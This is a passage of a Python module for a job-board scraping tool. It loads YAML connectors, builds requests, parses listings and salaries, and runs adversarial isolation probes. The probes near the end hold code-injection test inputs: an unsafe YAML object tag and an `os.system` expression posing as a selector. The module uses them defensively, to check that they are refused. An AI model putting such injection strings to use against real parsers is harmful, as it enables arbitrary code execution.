        parts.append(f"{location}: {error['msg']}")
    return "; ".join(parts)


def parse_connector(text: str) -> Connector:
    """Turn connector YAML text into a `Connector`, or raise `ConnectorError`.

    `yaml.safe_load` is the only loader used anywhere in this module — it
    resolves only the built-in scalar/sequence/mapping tags, so a
    `!!python/object` (or any other constructor) tag raises a `YAMLError`
    here rather than instantiating anything.
    """
    try:
        raw = yaml.safe_load(text)
    except yaml.YAMLError as exc:
        raise ConnectorError(f"not valid YAML: {exc}") from exc
    if not isinstance(raw, dict):
        raise ConnectorError(f"expected a mapping, got {type(raw).__name__}")
    try:
        return Connector.model_validate(raw)
    except ValidationError as exc:
        raise ConnectorError(_format(exc)) from exc


def _read(path: Path) -> str:
    if not path.exists():
        raise ConnectorError(f"connector file not found: {path}")
    try:
        return path.read_text(encoding="utf-8")
    except UnicodeDecodeError as exc:
        raise ConnectorError(f"{path.name}: not valid UTF-8: {exc}") from exc
    except OSError as exc:
        raise ConnectorError(f"{path.name}: cannot be read: {exc}") from exc


def load_connector(path: Path) -> Connector:
    """Read one connector, given either its package directory or its yaml file.

    The **name** is part of the contract, the same way a dimension's filename
    must match its `id` (`dimensions.py`): "one file per site naming the site
    and its locale" (payload) is meaningless if the file can call itself
    anything, so a mismatch is a load-time `ConnectorError` like any other.

    What carries that name moved with T53. A shared connector is a *package* —
    `connectors/<site>_<locale>/` holding `connector.yaml`, `meta.yaml` and a
    `fixture/` — because the things a borrower needs in order to trust it
    (who maintains it, when it last worked, a recorded response to check it
    against offline) have nowhere to live in a lone selector file. So the
    directory carries the name and `connector.yaml` inside it is always called
    that; passing the yaml file directly still works, and is what the contract
    checker and the tests do when they build one in a tmp_path.
    """
    if path.is_dir():
        package, target = path, path / CONNECTOR_FILENAME
        if not target.is_file():
            raise ConnectorError(f"{path.name}: no {CONNECTOR_FILENAME} in the package")
    else:
        # A file named connector.yaml is inside a package that carries the
        # name; anything else is a bare file that carries it itself.
        package, target = (path.parent, path) if path.name == CONNECTOR_FILENAME else (path, path)
    connector = parse_connector(_read(target))
    expected = f"{connector.site}_{connector.locale}"
    actual = package.name if package is not target else package.stem
    if actual != expected:
        raise ConnectorError(
            f"{path.name}: site/locale {expected!r} does not match its name (expected {expected})"
        )
    return connector


def connector_packages(directory: Path = DEFAULT_CONNECTORS_DIR) -> list[Path]:
    """Every connector package under `directory`, sorted by name.

    A package is a directory holding a `connector.yaml`. A directory without
    one is not silently skipped — `load_connector` raises on it — because a
    half-made package is exactly what a contributor produces and exactly what
    a check that ignores it would let through.
    """
    if not directory.is_dir():
        raise ConnectorError(f"connector directory not found: {directory}")
    return sorted(p for p in directory.iterdir() if p.is_dir() and not p.name.startswith("."))


def load_connectors(directory: Path = DEFAULT_CONNECTORS_DIR) -> list[Connector]:
    """Load every connector package in `directory`, sorted by name.

    Packages only. An interim version also loaded loose `<site>_<locale>.yaml`
    files beside them, and review on #77 found the hole that opened: the
    contract checker discovers packages, so a loose file would have been
    *loaded at runtime and never checked* — CI reporting zero violations while
    shipping a connector nothing had looked at. Two discovery rules for one
    library is the bug, not the loose file.

    It also could not keep its own ordering promise, since directories were
    sorted separately from files and then concatenated, putting `zboard_en`
    before `aboard_en`.
    """
    return [load_connector(path) for path in connector_packages(directory)]


# ---------------------------------------------------------------------------
# interpretation — parsing recorded markup with a loaded connector


def accepts_query(connector: Connector) -> bool:
    """Whether this board's listing URL has a slot for the candidate's terms.

    A board without one is not broken — `getmanfred_es` returns its whole
    active list and is filtered afterwards. It is reported rather than
    assumed, because "searched for what you asked" and "returned everything
    it had" are different results and a caller that cannot tell them apart
    will describe the second as the first.
    """
    return QUERY_PLACEHOLDER in connector.list.url_pattern


def build_list_urls(
    connector: Connector, *, page_count: int | None = None, query: str | None = None
) -> list[str]:
    """The sequence of list-page URLs `connector.list` describes.

    `pagination.mode` is honoured, not just `max_pages`: `mode: "none"`
    means the site has no second page to describe, so when the *connector's
    own* `max_pages` is what decides the count (`page_count` not given),
    exactly one URL is returned regardless of what `max_pages` says.
    `Pagination`'s own validator already refuses `max_pages > 1` alongside
    `mode: "none"` at load — a well-formed, freshly-loaded connector cannot
    reach this function in the contradictory state at all — but the clamp is
    repeated here rather than trusted to have happened upstream, because a
    `Connector`/`Pagination` built via `model_copy(update=...)` (as this
    module's own tests do, and as a future caller might) does not re-run
    Pydantic validators, so the contradiction can still exist on an in-memory
    object. Without this clamp such an object would make `build_list_urls`
    emit the *same* URL `max_pages` times — T12's fetcher issuing duplicate
    identical requests and potentially collecting duplicate offers.

    An explicit `page_count` argument is a caller's direct instruction for
    how many URLs to build and is honoured as given, exactly as before —
    `mode` only overrides the *default* derived from the connector's own
    `max_pages`.

    Substitution is `str.replace`, not `str.format` — see `PAGE_PLACEHOLDER`'s
    comment. This never issues a request; T12 does that.
    """
    if page_count is not None:
        pages = page_count
    else:
        pages = connector.list.pagination.max_pages
        if connector.list.pagination.mode == "none":
            pages = min(pages, 1)
    start = connector.list.pagination.start
    pattern = connector.list.url_pattern
    if QUERY_PLACEHOLDER in pattern:
        if query is None or not query.strip():
            raise ConnectorError(
                f"{connector.site}: url_pattern carries {QUERY_PLACEHOLDER} but no "
                "search terms were supplied — a board that asks what to search "
                "for must not be searched for nothing"
            )
        pattern = pattern.replace(QUERY_PLACEHOLDER, quote(query, safe=""))
    return [pattern.replace(PAGE_PLACEHOLDER, str(start + offset)) for offset in range(pages)]


@dataclass(frozen=True)
class ListRequest:
    """One list-page request, described rather than issued.

    Everything a fetcher needs and nothing it does not: this module still
    never opens a socket (see "Fetching is not this module's job"), and a
    connector still cannot name a header — `headers` is derived from the
    declared body form, so there is nowhere for an `Authorization` to be
    written even by a contributor who wants one.
    """

    url: str
    method: str
    headers: dict[str, str]
    #: `None` for a GET. Serialised UTF-8 JSON for a declared `body_json`.
    body: bytes | None


def _page_substituted(body: Any, page: int, param: str | None) -> Any:
    """`body` with the **one** declared page key replaced by the page number.

    The substitution is on the parsed structure, never on the serialised text.
    A string whose entire content is `"{page}"` becomes a JSON *number*, so a
    board expecting `{"Page": 2}` gets that and not `{"Page": "2"}`; nothing a
    connector wrote is ever concatenated into a string that is then parsed as
    JSON, so the body's *shape* cannot vary by page.

    Exactly one position varies, and it is the one `pagination.param` names.
    This used to walk the whole structure replacing every `{page}` it found,
    which read as harmless because `ListPage` was thought to refuse a body
    with any other occurrence — it did not (T109), so a nested placeholder
    beside a legal top-level one was substituted while the same nested
    placeholder alone was refused at load. Both readers now come from
    `_page_placeholder_paths`: the load check requires the named key to be the
    only position, and this replaces that key and nothing else, so the two
    cannot drift apart again by one being widened.

    Defensive rather than trusting for the same reason `build_list_urls`
    repeats its clamp: a `model_copy(update=...)` object never met the
    validator, so the key is replaced only when it really holds the
    placeholder.
    """
    if param is None or not isinstance(body, dict) or body.get(param) != PAGE_PLACEHOLDER:
        return body
    return {**body, param: page}


def build_list_requests(
    connector: Connector, *, page_count: int | None = None, query: str | None = None
) -> list[ListRequest]:
    """The sequence of list-page **requests** `connector.list` describes.

    `build_list_urls` answers "which URLs", which was the whole question while
    every connector was a GET. It is not the whole question for a board whose
    search is a POST carrying the query in its body (T89): two pages of such a
    board are the *same* URL and differ only in the payload, so a caller
    holding URLs alone would issue the first page twice.

    A GET connector gets exactly what it always did — its URL, no body, no
    headers — which is the property the gate enumerates over every committed
    package rather than trusting to review.
    """
    page = connector.list
    urls = build_list_urls(connector, page_count=page_count, query=query)
    if page.body_json is None:
        derived = client_headers(page.client, page.client_target)
        return [
            ListRequest(url=url, method=page.method, headers=derived, body=None) for url in urls
        ]
    start = page.pagination.start
    # `pagination.param` names a *body* key only under `mode: body_field`; under
    # `query_param` and `path_segment` it names a URL key, and handing that name to
    # the body substituter is how a validated POST with a literal body acquired a
    # `page` field nothing declared (#338 second-reader F2). The coupling is bound
    # here rather than trusted to the load check, which is the same posture the
    # rest of this module takes toward its own safety properties.
    paginating_key = page.pagination.param if page.pagination.mode == "body_field" else None
    return [
        ListRequest(
            url=url,
            method=page.method,
            headers={
                "Content-Type": JSON_CONTENT_TYPE,
                **client_headers(page.client, page.client_target),
            },
            body=serialise_body(_page_substituted(page.body_json, start + offset, paginating_key)),
        )
        for offset, url in enumerate(urls)
    ]


def _extract(node: Node, selector: FieldSelector, compiled: SimpleSelector) -> str | None:
    match = select_first(node, compiled)
    if match is None:
        return None
    if selector.attr is not None:
        value = match.attrs.get(selector.attr)
    elif selector.take == "last_text_node":
        # The element's final text piece rather than the concatenation of all
        # of them. #356's own suggestion, and it adds no syntax: on every one
        # of arbeitsagentur.de's three title elements the title is the last
        # piece and the ordinal prefix is an earlier one.
        pieces = [piece.strip() for piece in match._iter_text() if piece.strip()]
        value = " ".join(pieces[-1].split()) if pieces else None
    else:
        value = match.text_content()
    if not value:
        return None
    return _take(selector.take, value) if selector.take else value


def parse_list_page(connector: Connector, html: str) -> list[dict[str, str]]:
    """Every item on one page of `connector.list`, as field-name → value.

    Interpretation only — this never fetches anything and never touches a
    connector-supplied string except by matching it against the closed
    selector grammar compiled at load time.
    """
    if connector.list.from_json is not None:
        source = connector.list.from_json
        rows: list[dict[str, str]] = []
        for document in _json_documents(html, source):
            for item in dig_container(document, compile_path(source.items or "")):
                rows.append(_json_record(item, source))
        return rows

    if connector.list.item is None:  # pragma: no cover - ListPage._exactly_one_route
        raise ConnectorError("list page declares neither an item selector nor a from_json source")
    root = parse_html(html)
    item_selector = compile_selector(connector.list.item)
    compiled_fields = {name: compile_selector(fs.css) for name, fs in connector.list.fields.items()}
    records: list[dict[str, str]] = []
    for item in select_all(root, item_selector):
        record: dict[str, str] = {}
        for name, field_selector in connector.list.fields.items():
            value = _extract(item, field_selector, compiled_fields[name])
            if value is not None:
                record[name] = value
        records.append(record)
    return records


def parse_detail_page(connector: Connector, html: str) -> dict[str, str]:
    """Every field of `connector.detail` found on one ad's own page."""
    if connector.detail is None:
        return {}
    if connector.detail.from_json is not None:
        documents = _json_documents(html, connector.detail.from_json)
        # First match wins, as `select_first` does for markup — a page carrying
        # two `JobPosting` blocks is describing one advert twice.
        return _json_record(documents[0], connector.detail.from_json) if documents else {}
    root = parse_html(html)
    record: dict[str, str] = {}
    for name, field_selector in connector.detail.fields.items():
        compiled = compile_selector(field_selector.css)
        value = _extract(root, field_selector, compiled)
        if value is not None:
            record[name] = value
    return record


def _as_float(value: str | None) -> float | None:
    """Parse a salary number that may be written in either the
    thousands-comma/decimal-dot convention (`"1,234.56"`, US/UK) or the
    thousands-dot/decimal-comma convention (`"1.234,56"`, most of continental
    Europe — including `es`, the locale of the only shipped connector,
    `connectors/examplejobs_es.yaml`). Naively stripping commas and keeping
    dots — the previous behaviour — silently turns `"1.234,56"` into
    `"1.23456"`: a ~1000x error with no exception, feeding straight into
    `Salary.min`/`Salary.max` and therefore into ranking. That is worse than
    returning nothing, so every branch below that cannot resolve the format
    with confidence returns `None` instead of guessing.

    Disambiguation rule, applied in this order:

    1. **Both separators present** (`.` and `,` both occur): the one that
       occurs *last* in the string is the decimal separator — it must occur
       exactly once — and every occurrence of the other character is a
       thousands separator, stripped. Covers `"1.234,56"` (comma last →
       decimal) and `"1,234.56"` (dot last → decimal) unambiguously; a
       decimal separator occurring more than once (e.g. malformed input) is
       refused, not guessed at.
    2. **One separator character, appearing exactly once**: if exactly three
       digits follow it, it is read as a thousands separator (`"1.234"` →
       `1234`, `"1,234"` → `1234`) — grouped-thousands is by far the more
       common reason a whole number carries a lone separator followed by
       exactly three digits, and salary figures are rarely quoted to three
       decimal places. Any other digit count after it (one, two, four or
       more) is read as the decimal separator (`"1234,56"` → `1234.56`,
       `"1234.5"` → `1234.5`). This one case is a deliberate, named
       resolution of what would otherwise be genuinely ambiguous — see the
       module's evidence gate philosophy: a documented rule beats a silent
       guess.
    3. **One separator character, appearing more than once**: only valid as
       repeated thousands-grouping (`"1.234.567"` → `1234567`,
       `"1,234,567"` → `1234567`) — the leading group must be 1-3 digits and
       every later group exactly 3; anything else (`"1.2.3"`, uneven groups)
       is genuinely ambiguous and returns `None`.
    4. **No separator**: parsed as a plain integer string.

    A leading `+`/`-` sign is preserved through every branch. Anything that
    does not reduce to plain digits (letters, multiple decimal points,
    empty groups) returns `None` rather than raising — same contract as the
    rest of this module's parsing: absent, never confidently wrong.
    """
    if value is None:
        return None
    text = value.strip().replace(" ", "").replace("\xa0", "")
    if not text:
        return None
    sign = ""
    if text[0] in "+-":
        sign, text = text[0], text[1:]
    if not text:
        return None

    dot_positions = [index for index, char in enumerate(text) if char == "."]
    comma_positions = [index for index, char in enumerate(text) if char == ","]

    candidate: str
    if dot_positions and comma_positions:
        if dot_positions[-1] > comma_positions[-1]:
            decimal_char, decimal_positions, thousands_char = ".", dot_positions, ","
        else:
            decimal_char, decimal_positions, thousands_char = ",", comma_positions, "."
        if len(decimal_positions) != 1:
            return None  # the "decimal" separator repeats — not a format we recognise
        integer_part, _, frac_part = text.rpartition(decimal_char)
        integer_part = integer_part.replace(thousands_char, "")
        if not integer_part.isdigit() or not frac_part.isdigit():
            return None
        candidate = f"{integer_part}.{frac_part}"
    elif dot_positions or comma_positions:
        sep_char = "." if dot_positions else ","
        positions = dot_positions or comma_positions
        if len(positions) == 1:
            following_digits = len(text) - positions[0] - 1
            if following_digits == 3:
                digits_only = text.replace(sep_char, "")
                if not digits_only.isdigit():
                    return None
                candidate = digits_only
            else:
                integer_part, _, frac_part = text.partition(sep_char)
                if not integer_part.isdigit() or not frac_part.isdigit():
                    return None
                candidate = f"{integer_part}.{frac_part}"
        else:
            groups = text.split(sep_char)
            if (
                all(group.isdigit() for group in groups)
                and 1 <= len(groups[0]) <= 3
                and all(len(group) == 3 for group in groups[1:])
            ):
                candidate = "".join(groups)
            else:
                return None  # inconsistent grouping — genuinely ambiguous
    else:
        if not text.isdigit():
            return None
        candidate = text

    try:
        return float(f"{sign}{candidate}")
    except ValueError:
        return None


def _as_wage(value: str | None) -> float | None:
    """`_as_float`, except that a figure of zero or less is not a wage.

    A board with nothing to publish does not always omit the field.
    getmanfred's list API sends `salaryFrom: 0` on 9 of its 21 live offers,
    beside a real `salaryTo`; the zero means "no floor stated", never "this
    job pays nothing". Passed through, it becomes
    `Salary(min=0.0, stated=True)` — a figure the advert never gave, on the
    one dimension the whole ranking turns on, and it sorts the offer to the
    bottom of the list as the worst-paid job on the board.

    This is deliberately NOT inside `_as_float`, whose job is to read a number
    out of two decimal conventions and which is used for that alone. "Zero is
    not a wage" is a fact about salaries, not about number formats, and it
    belongs at the one call site that is building a `Salary`.

    Negatives go the same way, for the same reason and at no extra cost:
    `_as_float` preserves a leading sign, and nothing that survives here
    should be able to claim an advert offered less than nothing.

    A board that publishes a genuine zero — an unpaid internship, a volunteer
    post — is not served by this, and no board in the survey does: they omit
    the field. If one ever states it, it will read as "no figure given", which
    is a smaller error than any of the alternatives here.
    """
    parsed = _as_float(value)
    if parsed is None or parsed <= 0:
        return None
    return parsed


def build_offer(
    connector: Connector,
    *,
    list_fields: dict[str, str] | None = None,
    detail_fields: dict[str, str] | None = None,
    url: str | None = None,
    source_ref: str | None = None,
) -> Offer:
    """Combine one item's list- and detail-page extractions into a
    normalised `Offer` (T11).

    Detail fields win on overlap — the detail page is the fuller record when
    both exist. `text` must survive from one page or the other; `Offer`
    itself refuses a blank body, and there is nothing here to invent one from.
    """
    merged: dict[str, str] = {**(list_fields or {}), **(detail_fields or {})}
    text = merged.get("text")
    if not text:
        raise ConnectorError("connector produced no 'text' field — nothing for the offer body")

    location = None
    if any(k in merged for k in ("location_raw", "location_country", "location_remote")):
        location = Location(
            raw=merged.get("location_raw"),
            country=merged.get("location_country"),
            remote=merged.get("location_remote"),
        )
    # A currency, or a period, with no figure that survived `_as_wage` is not a
    # stated salary. The old condition asked whether any salary KEY was present,
    # so an advert sending `salaryFrom: 0`, `salaryTo: 0` and `currency: "€"` —
    # which no shipped fixture does today, and weworkremotely's JSON-LD
    # `minValue: '0' / maxValue: '0'` is one connector-change away from doing —
    # produced `Salary(stated=True)` carrying no numbers at all. That is worse
    # than no salary: `stated` is what the ranking reads to mean "the employer
    # said", and it would be saying it about nothing.
    salary = None
    minimum = _as_wage(merged.get("salary_min"))
    maximum = _as_wage(merged.get("salary_max"))
    if minimum is not None or maximum is not None:
        salary = Salary(
            min=minimum,
            max=maximum,
            currency=merged.get("salary_currency"),
            period=merged.get("salary_period"),
            stated=True,
        )
    try:
        return Offer(
            id=compute_offer_id(text),
            source=connector.site,
            source_ref=source_ref or merged.get("source_ref"),
            url=url or merged.get("url"),
            title=merged.get("title"),
            company=merged.get("company"),
            location=location,
            salary=salary,
            language=connector.locale,
            text=text,
        )
    except ValidationError as exc:
        raise ConnectorError(f"parsed fields did not produce a valid offer: {exc}") from exc


def build_search_offer(
    *,
    text: str,
    url: str | None = None,
    title: str | None = None,
    company: str | None = None,
    language: Language | None = None,
    source_ref: str | None = None,
) -> Offer:
    """The offer a general web search produced, stamped as such (D-16).

    There is a real path — the one a session takes when no connector covers
    the candidate's market — that turns a search hit into a stored offer. Left
    to prose, it produced records whose `source` was whatever the model wrote,
    and a candidate was shown seven adverts with nothing anywhere saying they
    came from a search of the open web rather than a search of their market.

    So it gets a constructor, and the constructor stamps `SEARCH_SOURCE`.
    `source` is not a parameter: a caller who could pass one could pass a
    board's name, which is the defect this exists to close. `source_ref`
    carries the query or the index entry the hit came from, for the same
    reason `build_offer` carries the listing reference — the trail back is
    part of the record, not something to reconstruct later.
    """
    try:
        return Offer(
            id=compute_offer_id(text),
            source=SEARCH_SOURCE,
            source_ref=source_ref,
            url=url,
            title=title,
            company=company,
            language=language,
            text=text,
        )
    except ValidationError as exc:
        raise ConnectorError(f"search result did not produce a valid offer: {exc}") from exc


# ---------------------------------------------------------------------------
# staleness


@dataclass(frozen=True)
class Staleness:
    """One connector's age against `max_age_days`, and the sentence a caller
    should say about it — never just a bare boolean, per spec-v2-process's
    "the tool should say so"."""

    connector_id: str
    days_since_verification: int
    stale: bool
    reason: str | None


def assess_staleness(
    connector: Connector,
    *,
    today: date | None = None,
    max_age_days: int = DEFAULT_STALE_AFTER_DAYS,
) -> Staleness:
    """How long since `connector.last_verified`, and whether that exceeds
    `max_age_days`."""
    as_of = today if today is not None else date.today()
    age = (as_of - connector.last_verified).days
    stale = age > max_age_days
    connector_id = f"{connector.site}_{connector.locale}"
    reason = (
        f"{connector_id} was last verified {age} day(s) ago (limit {max_age_days})"
        if stale
        else None
    )
    return Staleness(
        connector_id=connector_id, days_since_verification=age, stale=stale, reason=reason
    )


@dataclass(frozen=True)
class ListingResult:
    """One page's parse, plus whether its connector is trustworthy right now.

    Kept together on purpose: a caller reading only `items` would treat a
    stale connector's empty page exactly like a search that genuinely came
    back empty — the "quietly returning nothing" spec-v2-process forbids.
    """

    items: tuple[dict[str, str], ...]
    stale: bool
    message: str | None


def collect_listing(
    connector: Connector,
    html: str,
    *,
    today: date | None = None,
    max_age_days: int = DEFAULT_STALE_AFTER_DAYS,
) -> ListingResult:
    """Parse one listing page and report it next to the connector's staleness."""
    items = parse_list_page(connector, html)
    staleness = assess_staleness(connector, today=today, max_age_days=max_age_days)
    message = None
    if staleness.stale:
        empty = " and returned zero listings" if not items else ""
        message = f"{staleness.reason}{empty} — reported stale, not trusted as a real result"
    return ListingResult(items=tuple(items), stale=staleness.stale, message=message)


# ---------------------------------------------------------------------------
# the gate — adversarial probes proving nothing a connector supplies runs


@dataclass(frozen=True)
class ProbeReport:
    """What the gate measured: how many adversarial attempts ran, and which
    ones were not refused."""

    probes_run: int
    violations: tuple[str, ...]


#: T132 — what `take:` must do, as a table read before the implementation and
#: kept beside it. Each row cites the reason its verdict is what it is, and the
#: fail-closed ones are the point: they are the direction where a wrong answer
#: is invisible. `None` means "this text is not that shape".
PARTIAL_EXTRACTION_CONTRACTS: tuple[tuple[str, str, str | None, str], ...] = (
    ("range_low", "\u20ac50.000 - \u20ac65.000", "50000", "landing.jobs, the band this exists for"),
    ("range_high", "\u20ac50.000 - \u20ac65.000", "65000", "the same span, other end"),
    ("currency", "\u20ac50.000 - \u20ac65.000", "EUR", "symbol, not code"),
    ("range_low", "1,234.56 - 2,345.67", "1234.56", "US convention, decimals kept"),
    ("range_high", "1.234,56 - 2.345,67", "2345.67", "continental convention, same figure"),
    (
        "range_low",
        "hasta \u20ac65.000, desde \u20ac50.000",
        "50000",
        "low is the smaller, not the first",
    ),
    ("range_low", "\u20ac60.000", None, "one figure is not a band — FAIL-CLOSED"),
    ("range_high", "Competitive", None, "no figures at all — FAIL-CLOSED"),
    (
        "range_low",
        "\u20ac250 - \u20ac350 per day, 40 hours",
        None,
        "three figures, nobody can say which two — FAIL-CLOSED",
    ),
    ("currency", "50000 - 65000", None, "no currency token — FAIL-CLOSED"),
    (
        "currency",
        "\u20ac50.000 (about $54,000)",
        None,
        "two currencies is a conversion — FAIL-CLOSED",
    ),
    ("range_low", "CAD 150K-190K", "150000", "foorilla.com writes every band this way"),
    ("range_high", "CAD 150K-190K", "190000", "the K is a multiplier, not decoration"),
    ("currency", "CAD 150K-190K", "CAD", "an ISO code with no symbol"),
    ("range_low", "$1.2M - $1.5M", "1200000", "M as well as K"),
    (
        "range_low",
        "40k hires, \u20ac50.000 - \u20ac65.000",
        None,
        "a k elsewhere makes three figures — FAIL-CLOSED",
    ),
)

#: Floor. A table that shrank reports `unmeasured` rather than a clean zero.
MINIMUM_PARTIAL_EXTRACTION_CONTRACTS = 16


def partial_extraction_defects() -> list[str]:
    """Every contract in `PARTIAL_EXTRACTION_CONTRACTS` whose verdict is wrong."""
    failures = []
    for take, text, expected, why in PARTIAL_EXTRACTION_CONTRACTS:
        actual = _take(take, text)  # type: ignore[arg-type]
        if actual != expected:
            failures.append(f"take:{take} on {text!r} -> {actual!r}, expected {expected!r} ({why})")
    return failures


class _Refused:
    """The verdict "the grammar must not compile this path at all"."""

    def __repr__(self) -> str:  # pragma: no cover - a label in a failure message
        return "REFUSED"


#: Distinct from `None`, and the distinction is the point: `None` is a path the
#: grammar accepted and that resolved to nothing, `REFUSED` is a path
#: `compile_path` must reject outright. A contract table that could not tell
#: them apart would score a refused spelling and a silently-empty one the same.
REFUSED: Final = _Refused()

#: The one document nearly every array-path contract is read against. Written
#: to hold, side by side, each shape the grammar has to have an answer for: a
#: populated array, an empty one, an array of objects, an array of a number, of
#: a bool and of a null, an object where an array might be, and a mapping whose
#: key is literally `"0"`.
_ARRAY_PATH_DOCUMENT: Final[dict[str, Any]] = {
    "locations": ["Marbella, Espa\u00f1a", "Madrid, Espa\u00f1a"],
    "empty": [],
    "offices": [{"city": "Barcelona"}],
    "figures": [50000],
    "flags": [True],
    "maybe": [None],
    "company": {"name": "Manfred"},
    "counts": {"0": "seven"},
    "nested": {"tags": ["alpha"]},
}

#: T118 — what an array path must resolve to, as a table derived from the
#: **grammar** and kept beside it, in the shape `PARTIAL_EXTRACTION_CONTRACTS`
#: established for `take:`. Each row cites why its verdict is what it is, and
#: the fail-closed rows are the ones that matter: a location that is missing is
#: a gap the candidate can see, while `{'city': 'Barcelona'}` or `M` landing in
#: `location_raw` is a place that is simply wrong and looks fine.
ARRAY_PATH_CONTRACTS: tuple[tuple[str, Any, str | _Refused | None, str], ...] = (
    (
        "locations.0",
        _ARRAY_PATH_DOCUMENT,
        "Marbella, Espa\u00f1a",
        "getmanfred's physical city, which no path could reach before T118",
    ),
    ("locations.1", _ARRAY_PATH_DOCUMENT, "Madrid, Espa\u00f1a", "an index other than the first"),
    ("locations.2", _ARRAY_PATH_DOCUMENT, None, "index past the end — FAIL-CLOSED"),
    (
        "empty.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        'getmanfred sends `"locations":[]` — absent, never an empty string — FAIL-CLOSED',
    ),
    (
        "locations",
        _ARRAY_PATH_DOCUMENT,
        None,
        "the array itself is still a container, so still a miss — the rule indexing must "
        "not relax — FAIL-CLOSED",
    ),
    (
        "offices.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        "the element is an object; `str({...})` must never reach `build_offer` — FAIL-CLOSED",
    ),
    ("offices.0.city", _ARRAY_PATH_DOCUMENT, "Barcelona", "a key after an index — `a.0.b`"),
    ("nested.tags.0", _ARRAY_PATH_DOCUMENT, "alpha", "an index after two keys"),
    (
        "company.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        "an object is not a sequence, so it is not indexable — FAIL-CLOSED",
    ),
    (
        "counts.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        'a mapping key spelled "0" is not element 0: an index reads a sequence and '
        "nothing else, and this is the row that states it — FAIL-CLOSED",
    ),
    (
        "locations.0.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        'a string is not a sequence either: `"Marbella"[0]` is `M`, which is not a '
        "place — FAIL-CLOSED",
    ),
    (
        "figures.0",
        _ARRAY_PATH_DOCUMENT,
        "50000",
        "a JSON number inside an array is a scalar like any other",
    ),
    (
        "flags.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        "JSON's `true` is not a wage, a title or a body, inside an array or out — FAIL-CLOSED",
    ),
    (
        "maybe.0",
        _ARRAY_PATH_DOCUMENT,
        None,
        'an element that is `null` is absent, never the text "None" — FAIL-CLOSED',
    ),
    (
        "locations.9999",
        _ARRAY_PATH_DOCUMENT,
        None,
        "a far index misses rather than raising — FAIL-CLOSED",
    ),
    (
        "locations.-1",
        _ARRAY_PATH_DOCUMENT,
        REFUSED,
        "there is no negative index, so nothing wraps around to the last element",
    ),
    (
        "locations.01",
        _ARRAY_PATH_DOCUMENT,
        REFUSED,
        "one spelling per index, and `01` is a second one",
    ),
    ("locations[0]", _ARRAY_PATH_DOCUMENT, REFUSED, "bracket syntax the grammar does not have"),
    (
        "locations.1_0",
        _ARRAY_PATH_DOCUMENT,
        REFUSED,
        "`_` is a Python numeric separator, not a JSON index",
    ),
    (
        "0",
        _ARRAY_PATH_DOCUMENT,
        REFUSED,
        "a bare leading index is `str.format`'s positional syntax, and a path names a "
        "field of a record",
    ),
    (
        "$",
        _ARRAY_PATH_DOCUMENT,
        None,
        "`$` still names the document, and a document is a container — `items:` reads it "
        "through `dig_container`, never `dig` — FAIL-CLOSED",
    ),
)

#: Floor, in `naming.MINIMUM_SCANNED`'s style: what is committed as the
#: denominator is this number, never the count of the day. It **rises** with
#: the table — CLAUDE.md requires the measured denominator to grow when a
#: second reader's cases are accepted — and never falls, so a table quietly
#: emptied reports `unmeasured` instead of a clean zero over nothing.
MINIMUM_ARRAY_PATH_CONTRACTS = 21


def _resolve_declared(path: str, document: Any) -> str | _Refused | None:
    """One contract's verdict: what a connector declaring `path` would read.

    Deliberately the whole journey a connector file takes — compile, then dig —
    because the grammar's safety property is split across the two and a table
    testing only `dig` would score `locations[0]` on whatever `dig` did with a
    path that never should have compiled.
    """
    try:
        compiled = compile_path(path)
    except ConnectorError:
        return REFUSED
    return dig(document, compiled)


def array_path_defects() -> list[str]:
    """Every contract in `ARRAY_PATH_CONTRACTS` whose verdict is wrong."""
    failures = []
    for path, document, expected, why in ARRAY_PATH_CONTRACTS:
        actual = _resolve_declared(path, document)
        if actual != expected:
            failures.append(f"{path!r} -> {actual!r}, expected {expected!r} ({why})")
    return failures


def measure_array_paths() -> dict[str, Any]:
    """T118's record: array paths resolved against the grammar, then counted.

    The defects are computed **before** the dict is built, so no run can write
    the claim and then discover it was wrong — the ordering #297 asks for.
    """
    defects = array_path_defects()
    pairs = len(ARRAY_PATH_CONTRACTS)
    measured: dict[str, Any] = {
        "connector_array_paths_misresolved": len(defects),
        "connector_array_path_pairs_at_least": MINIMUM_ARRAY_PATH_CONTRACTS,
        "connector_array_path_defects": defects,
        "gate_status": "measured" if pairs >= MINIMUM_ARRAY_PATH_CONTRACTS else "unmeasured",
    }
    if pairs < MINIMUM_ARRAY_PATH_CONTRACTS:
        measured["reasons"] = [
            f"only {pairs} path/document pair(s) evaluated (floor "
            f"{MINIMUM_ARRAY_PATH_CONTRACTS}) — zero misresolutions over a shrunken "
            "table says nothing"
        ]
    return measured


def write_array_path_evidence(evidence: Path) -> dict[str, Any]:
    """Measure and record `status/evidence/T118.json`."""
    measured = measure_array_paths()
    evidence.parent.mkdir(parents=True, exist_ok=True)
    evidence.write_text(json.dumps(measured, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    return measured


def probe_connector_isolation() -> ProbeReport:
    """Try every way a connector file could try to run code, and count the
    ones that got through.

    Mirrors `integral.identity.probe_leaks`'s shape: this is the gate's
    measurement, deliberately adversarial, and a probe that returns normally
    where it should have been refused is a violation — named, not swallowed.
    """
    violations: list[str] = []
    probes = 0

    def must_be_refused(label: str, attempt: Any) -> None:
        nonlocal probes
        probes += 1
        try:
            attempt()
        except (ConnectorError, ValidationError, ValueError):
            return
        violations.append(label)

    # 1. An unsafe YAML tag attempting to construct an arbitrary object.
    must_be_refused(
        "!!python/object tag constructs an object instead of failing to load",
        lambda: parse_connector(
            "site: !!python/object/apply:builtins.str ['x']\n"
            "locale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.x'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 2. A Python expression as a selector — must fail to *parse*, not run.
    must_be_refused(
        "a python expression as a css selector is accepted instead of refused",
        lambda: compile_selector("__import__('os').system('touch /tmp/pwned')"),
    )

    # 3. The same, smuggled inside an otherwise well-formed connector file —
    #    caught by `FieldSelector`'s own validator, at load, not merely when
    #    something later tries to use it.
    must_be_refused(
        "a smuggled selector expression loads successfully as a connector field",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
